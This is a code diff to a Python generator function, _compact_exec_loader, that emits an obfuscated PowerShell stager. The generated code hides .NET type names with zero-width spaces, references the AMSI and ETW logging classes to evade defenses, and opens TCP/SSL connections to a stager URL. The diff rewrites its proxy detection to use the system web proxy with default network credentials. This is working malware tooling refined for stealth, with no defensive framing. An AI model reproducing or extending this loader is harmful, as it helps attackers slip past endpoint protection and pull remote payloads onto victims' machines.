@@ -1549,7 +1549,7 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
 
     vk      = _rv(); vd  = _rv(); va   = _rv()
     vurl    = _rv(); vh  = _rv(); vp   = _rv(); vq   = _rv()
-    vwc     = _rv(); vpx = _rv(); vpu  = _rv(); vup  = _rv()
+    vpx = _rv(); vpu  = _rv(); vup  = _rv()
     vch     = _rv(); vcp = _rv()
     vtcp    = _rv(); vns = _rv()
     vconn   = _rv(); vrbuf = _rv()
@@ -1567,7 +1567,6 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
 
     etw_z,  vetw  = _zwsp_type("System.Management.Automation.PSEtwLogProvider")
     amsi_z, vamsi = _zwsp_type("System.Management.Automation.AmsiUtils")
-    wc_z,   vwct  = _zwsp_type("Net.WebClient")
     tcp_z,  vtcpt = _zwsp_type("Net.Sockets.TcpClient")
     ssl_z,  vsslt = _zwsp_type("Net.Security.SslStream")
     ms_z,   vmst  = _zwsp_type("IO.MemoryStream")
@@ -1585,8 +1584,8 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
 
     lines = []
 
-    # L1: 4 ZWSP type-name setups merged on one line
-    lines.append(f"{etw_z};{amsi_z};{wc_z};{tcp_z}")
+    # L1: 3 ZWSP type-name setups merged on one line
+    lines.append(f"{etw_z};{amsi_z};{tcp_z}")
 
     # L2: 3 ZWSP type-name setups merged on one line
     lines.append(f"{ssl_z};{ms_z};{sb_z}")
@@ -1608,11 +1607,10 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
         f"{vq}=([Uri]{vurl}).PathAndQuery"
     )
 
-    # L5: proxy detection via WebClient (ZWSP type name, Windows integrated auth)
+    # L5: proxy detection — GetSystemWebProxy() is never null (unlike WebClient.Proxy)
     lines.append(
-        f"{vwc}=New-Object {vwct};"
-        f"{vwc}.UseDefaultCredentials=$true;"
-        f"{vpx}={vwc}.Proxy;"
+        f"{vpx}=[Net.WebRequest]::GetSystemWebProxy();"
+        f"{vpx}.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;"
         f"{vpu}={vpx}.GetProxy([Uri]{vurl});"
         f"{vup}=({vpu}.Host -ne {vh} -or {vpu}.Port -ne {vp})"
     )
